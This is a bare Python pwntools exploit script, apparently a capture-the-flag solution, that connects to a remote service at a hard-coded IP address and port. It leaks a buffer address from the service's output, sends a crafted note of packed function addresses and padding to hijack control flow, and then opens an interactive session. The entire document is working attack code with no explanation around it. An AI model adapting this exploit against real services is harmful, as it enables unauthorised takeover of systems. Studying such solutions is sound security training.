from pwn import *

def exploit():
    r = remote("124.16.75.117", 51005)
    r.sendlineafter(b"input your name:", b"armin")
    r.sendlineafter(b"choice:>>", b"1")

    buf_addr = r.recvuntil(b"\nP")[14:-2]
    shell_addr = int(buf_addr, 16) + 4
    flag_addr = 0x08048644
    exit_addr = 0x0804889b
    
    r.sendlineafter(
        b"input your note:", p32(flag_addr) + p32(exit_addr) 
        + b"a" * 16 + p32(shell_addr) + b"a" * 4)
    r.sendlineafter(b"choice:>>", b"3")
    r.interactive()

if __name__ == "__main__":
    exploit()